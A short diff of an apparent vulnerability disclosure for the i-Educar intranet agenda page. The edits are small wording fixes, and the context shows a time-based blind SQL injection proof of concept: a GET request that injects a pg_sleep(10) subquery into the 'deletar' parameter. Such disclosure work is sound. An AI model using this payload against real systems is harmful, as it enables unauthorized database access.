@@ -55,7 +55,7 @@ Cookie: i_educar_session=oPSWZGZAoaklSkX60cVXos50m3HfqrO8VW8PC0KW
 
 **PoC (Proof of Concept)**
 
-1. First send a normal request:
+1. First, send a normal request:
 ![Normal request](image.png)
 
 2. Time delay using pg_sleep(10):
@@ -63,8 +63,7 @@ Cookie: i_educar_session=oPSWZGZAoaklSkX60cVXos50m3HfqrO8VW8PC0KW
 GET /intranet/agenda.php?cod_agenda=2&time=1769548041&deletar=1'%20AND%20(SELECT%201%20FROM%20pg_sleep(10))%20IS%20NULL%20AND%20'a'%3D'a
 ```
 ![Request with payload](image%201.png)
-
-• Expected delay: ~10 seconds 
+Expected delay: ~10 seconds 
 
 ## **Impact**
 
